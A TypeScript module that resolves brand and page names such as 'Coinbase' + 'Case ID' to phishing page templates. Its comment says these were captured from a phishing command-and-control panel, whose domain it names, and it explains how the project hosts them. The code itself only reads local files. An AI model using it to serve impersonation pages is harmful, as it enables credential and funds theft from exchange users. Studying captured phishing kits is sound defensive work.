/**
 * Visitor template resolver.
 *
 * Given a brand + page (as the captured panel exposes them on the wire,
 * e.g. "Coinbase" + "Loading" or "Coinbase" + "Case ID"), resolve to a
 * slug + on-disk HTML file under data/visitor-templates/.
 *
 * The HTML files are full standalone Next.js renders we captured from
 * the original C&C panel (https://alkfjalknlgjnwbelfnalnfskanafa.com)
 * after the Domains tab provisioned a phishing domain. They reference
 * /_next/static/... which we host from /static/_next/* in this project.
 */
import { readFileSync, existsSync } from 'node:fs';
import { resolve, join } from 'node:path';
import { findTemplate, VISITOR_TEMPLATES } from '$lib/visitorTemplates';

export { findTemplate, VISITOR_TEMPLATES };
export type { VisitorTemplate } from '$lib/visitorTemplates';

const TEMPLATE_ROOT = resolve(process.cwd(), 'data', 'visitor-templates');

export function loadTemplateHtml(brand: string, page: string): string | undefined {
	const t = findTemplate(brand, page);
	if (!t) return undefined;
	const file = join(TEMPLATE_ROOT, `${t.slug}.html`);
	if (!existsSync(file)) return undefined;
	return readFileSync(file, 'utf-8');
}
